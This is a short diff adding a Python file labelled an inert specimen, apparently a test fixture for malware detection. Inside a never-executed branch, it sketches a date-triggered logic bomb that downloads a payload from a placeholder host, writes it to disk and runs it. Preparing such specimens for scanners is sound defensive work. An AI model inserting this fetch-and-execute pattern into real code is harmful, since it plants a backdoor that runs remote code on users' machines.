@@ -1,0 +1,8 @@
+"""Inert specimen: static reading only; never import or execute."""
+if False:
+    import datetime
+    import subprocess
+    if datetime.date.today() >= datetime.date(2099, 1, 1):
+        payload = client.get('https://example.invalid/payload').content
+        workspace.joinpath('fixture-payload').write_bytes(payload)
+        subprocess.run(['fixture-payload'])
